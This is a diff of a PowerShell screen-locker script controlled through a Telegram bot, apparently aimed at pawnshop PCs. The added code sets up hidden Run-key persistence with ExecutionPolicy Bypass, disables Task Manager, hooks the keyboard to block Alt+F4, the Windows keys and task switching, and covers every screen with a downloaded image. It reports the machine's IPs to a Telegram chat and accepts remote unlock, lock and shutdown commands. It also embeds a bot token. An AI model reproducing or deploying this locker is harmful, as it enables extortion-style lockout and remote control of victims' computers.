@@ -1,7 +1,5 @@
 
-# Pawnshop Lockdown Script with Full Telegram Control and Alt+F4 Block
-
-# --- Configuration ---
+# CONFIG
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $tempImagePath = "$env:TEMP\image.jpg"
 $botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
@@ -11,122 +9,136 @@ $user = $env:USERNAME
 $unlockCommand = "/unlock$user"
 $lockCommand = "/lock$user"
 $shutdownCommand = "/shutdown$user"
-$lockFile = "$env:APPDATA\lock_status.txt"
+$lockFile = "$env:APPDATA\pawnshop_lock_status.txt"
+$RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$RunValueName = "PawnShopLock"
 
-# Create lock file if it doesn't exist
-if (-not (Test-Path $lockFile)) { "locked" | Out-File -FilePath $lockFile -Force -Encoding UTF8 }
+# Create lock file if missing
+if (-not (Test-Path $lockFile)) { "locked" | Out-File $lockFile -Force }
 
-# Check lock state
-try {
-    $state = Get-Content $lockFile -ErrorAction Stop
-} catch {
-    $state = "locked"
-}
-
+# Read lock status
+$state = Get-Content -Path $lockFile -ErrorAction SilentlyContinue
 if ($state -eq "unlocked") {
+    Remove-ItemProperty -Path $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
     return
 }
 
-# Download image
-Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing
+# Save script to startup (only if from file)
+if ($MyInvocation.MyCommand.Path) {
+    $startCmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
+    Set-ItemProperty -Path $RunKey -Name $RunValueName -Value $startCmd -Type String -Force
+}
 
-# Send Telegram notification
-try {
-    $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^127|169' })[0].IPAddress
-} catch { $ipLocal = "n/a" }
+# Disable Task Manager
+New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Type DWord -Force
 
-try { $ipPublic = (Invoke-RestMethod "https://api.ipify.org") } catch { $ipPublic = "n/a" }
-
-$message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic`n`nCommands:`n$unlockCommand`n$lockCommand`n$shutdownCommand`n/unlock$pc`n/shutdown$pc`n/lock$pc"
-$body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
-Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
-
-# Load UI libs
+# Load assemblies
 Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
-# Keyboard Hook to block Alt+F4 only
+# Hook keyboard to block ALT+F4 and more
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 public class KeyBlocker {
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+    private const int WM_SYSKEYDOWN = 0x0104;
     private static IntPtr hookId = IntPtr.Zero;
-    private static bool alt = false;
-    private delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);
-    private static HookProc proc = HookCallback;
-    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, HookProc proc, IntPtr mod, uint tid);
-    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
-    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int code, IntPtr wParam, IntPtr lParam);
-    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
-    const int WH_KEYBOARD_LL = 13;
-    const int WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104, WM_KEYUP = 0x0101, WM_SYSKEYUP = 0x0105;
+    private static LowLevelKeyboardProc proc = HookCallback;
+    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
+    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
     public static void Block() {
         hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
     }
     public static void Unblock() {
-        UnhookWindowsHookEx(hookId);
+        if (hookId != IntPtr.Zero) UnhookWindowsHookEx(hookId);
     }
-    private static IntPtr HookCallback(int code, IntPtr wParam, IntPtr lParam) {
-        if (code >= 0) {
-            int vk = Marshal.ReadInt32(lParam);
-            if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) {
-                if (vk == 0x12) alt = true;
-                if (vk == 0x73 && alt) return (IntPtr)1; // Alt+F4
-                if (vk == 0x43) Environment.Exit(0); // C to exit manually
-            }
-            if (wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP) {
-                if (vk == 0x12) alt = false;
-            }
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+        if (nCode >= 0) {
+            int vkCode = Marshal.ReadInt32(lParam);
+            bool alt = (Control.ModifierKeys & Keys.Alt) == Keys.Alt;
+            bool ctrl = (Control.ModifierKeys & Keys.Control) == Keys.Control;
+            if ((vkCode == 0x73 && alt) || vkCode == 0x5B || vkCode == 0x5C || (vkCode == 0x09 && alt) || (vkCode == 0x09 && ctrl)) return (IntPtr)1;
         }
-        return CallNextHookEx(hookId, code, wParam, lParam);
+        return CallNextHookEx(hookId, nCode, wParam, lParam);
     }
 }
 "@
+
 [KeyBlocker]::Block()
 
-# Display full screen image
+# Download image
+Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing
+
+# Show image fullscreen
 $forms = foreach ($screen in [Windows.Forms.Screen]::AllScreens) {
-    $form = New-Object Windows.Forms.Form -Property @{ TopMost = $true; FormBorderStyle = 'None'; WindowState = 'Maximized'; StartPosition = 'Manual'; Bounds = $screen.Bounds; KeyPreview = $true; Cursor = [Windows.Forms.Cursors]::None }
+    $form = New-Object Windows.Forms.Form -Property @{
+        FormBorderStyle='None'; WindowState='Maximized'; TopMost=$true; Bounds=$screen.Bounds
+        ShowInTaskbar=$false; Cursor=[Windows.Forms.Cursors]::None
+    }
+    $pb = New-Object Windows.Forms.PictureBox -Property @{
+        Image=[Drawing.Image]::FromFile($tempImagePath); Dock='Fill'; SizeMode='StretchImage'
+    }
     $form.Add_FormClosing({ if (-not $script:AllowClose) { $_.Cancel = $true } })
-    $pb = New-Object Windows.Forms.PictureBox -Property @{ Image = [Drawing.Image]::FromFile($tempImagePath); Dock = 'Fill'; SizeMode = 'StretchImage' }
     $form.Controls.Add($pb)
     $form.Show()
     $form
 }
 
-# Telegram listener
+# Send Telegram message
+try {
+    $ipLocal = (Get-NetIPAddress | ?{$_.AddressFamily -eq "IPv4" -and $_.IPAddress -notmatch '^169|^127'} | Select -First 1 -Expand IPAddress)
+} catch { $ipLocal = "n/a" }
+try { $ipPublic = Invoke-RestMethod "https://api.ipify.org" } catch { $ipPublic = "n/a" }
+$msg = "PC-ul $user ($pc) a fost blocat.`nIP: $ipLocal | $ipPublic`n`n/unlock$user`n/shutdown$user`n/lock$user`n/unlock$pc`n/shutdown$pc`n/lock$pc"
+$body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
+Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
+
+# Telegram poller
+$script:AllowClose = $false
 $offset = 0
 try {
-    $init = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates"
-    if ($init.result.Count -gt 0) {
-        $offset = ($init.result | Select-Object -Last 1).update_id + 1
-    }
-} catch { $offset = 0 }
+    $latest = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?limit=1"
+    if ($latest.result) { $offset = $latest.result[0].update_id + 1 }
+} catch {}
 
-$script:AllowClose = $false
-$timer = New-Object Windows.Forms.Timer -Property @{ Interval = 3000 }
+$timer = New-Object Windows.Forms.Timer
+$timer.Interval = 4000
 $timer.Add_Tick({
     try {
-        $resp = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
-        foreach ($u in $resp.result) {
+        $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
+        foreach ($u in $updates.result) {
             $offset = $u.update_id + 1
-            $txt = $u.message.text.ToLower().Trim()
-            if ($txt -eq "/unlock$user" -or $txt -eq "/unlock$pc") {
+            $text = $u.message.text.ToLower().Trim()
+            if ($text -eq "/unlock$user" -or $text -eq "/unlock$pc") {
                 "unlocked" | Out-File $lockFile -Force
+                Remove-ItemProperty $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
+                Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 0 -Force
                 $script:AllowClose = $true
                 [Windows.Forms.Application]::Exit()
-            } elseif ($txt -eq "/lock$user" -or $txt -eq "/lock$pc") {
-                "locked" | Out-File $lockFile -Force
-            } elseif ($txt -eq "/shutdown$user" -or $txt -eq "/shutdown$pc") {
-                "unlocked" | Out-File $lockFile -Force
+            }
+            elseif ($text -eq "/shutdown$user" -or $text -eq "/shutdown$pc") {
+                Remove-ItemProperty $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
                 Stop-Computer -Force
+            }
+            elseif ($text -eq "/lock$user" -or $text -eq "/lock$pc") {
+                "locked" | Out-File $lockFile -Force
+                Set-ItemProperty $RunKey -Name $RunValueName -Value $startCmd -Type String -Force
             }
         }
     } catch {}
 })
 $timer.Start()
 
+# Start app loop
 [Windows.Forms.Application]::Run()
 
+# Cleanup
 $timer.Stop()
 [KeyBlocker]::Unblock()
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 0 -Force
